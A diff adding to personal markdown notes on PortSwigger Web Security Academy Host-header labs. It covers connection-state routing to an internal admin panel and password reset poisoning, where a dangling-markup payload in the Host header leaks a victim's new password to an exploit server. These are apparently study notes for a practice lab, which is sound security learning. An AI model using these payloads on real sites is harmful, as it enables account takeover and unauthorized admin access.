@@ -202,3 +202,36 @@ POST /admin/delete HTTP/1.1
 6. Send the requests in sequence down a single connection to solve the lab.
 
 **Workflow**:
+1. Send the `GET /` request to Burp Repeater. Make the following adjustments:
+    - Change the path to `/admin`.
+    - Change `Host` header to `192.168.0.1`.
+	![](Pasted%20image%2020250314181912.png)
+2. Duplicate the tab, then add both tabs to a new group. Select the first tab and make the following adjustments:
+    - Change the path back to `/`.
+    - Change the `Host` header back to `YOUR-LAB-ID.h1-web-security-academy.net`
+    ![](Pasted%20image%2020250314182350.png)
+3. Using the drop-down menu next to the **Send** button, change the send mode to **Send group in sequence (single connection)**. Change the `Connection` header to `keep-alive`. Send the sequence and check the responses. Observe that the second request has successfully accessed the admin panel.
+	![](Pasted%20image%2020250314182650.png)
+4.  Observe that the admin panel contains an HTML form for deleting a given user. Make a note of the following details:
+    - The action attribute (`/admin/delete`)
+    - The name of the input (`username`)
+    - The `csrf` token.
+    ![](Pasted%20image%2020250314183206.png)
+
+
+# 6. Password reset poisoning via dangling markup
+This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.
+You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.
+
+**Analysis**:
+1. Go to the login page and request a password reset for your own account. Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text.
+2. In the proxy history, study the response to the `GET /email` request. Observe that the HTML content for your email is written to a string, but this is being sanitized using the `DOMPurify` library before it is rendered by the browser.In the email client, notice that you have the option to view each email as raw HTML instead. Unlike the rendered version of the email, this does not appear to be sanitized in any way.
+3. Send the `POST /forgot-password` request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email:
+    `Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport`
+4. In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password. Send the `POST /forgot-password` request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server:
+    `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`
+5. Check the email client. You should have received a new email in which most of the content is missing. Go to the exploit server and check the access log. Notice that there is an entry for a request that begins `GET /?/login'>[…]`, which contains the rest of the email body, including the new password.
+6. In Burp Repeater, send the request one last time, but change the `username` parameter to `carlos`. Refresh the access log and obtain Carlos's new password from the corresponding log entry. Log in as `carlos` using this new password to solve the lab.
+
+**Workflow**:
+1. Go to the login page and request a password reset for your own account. Go to the exploit server and open the email client to find the password reset email. Observe that the link in the email simply points to the generic login page and the URL does not contain a password reset token. Instead, a new password is sent directly in the email body text.
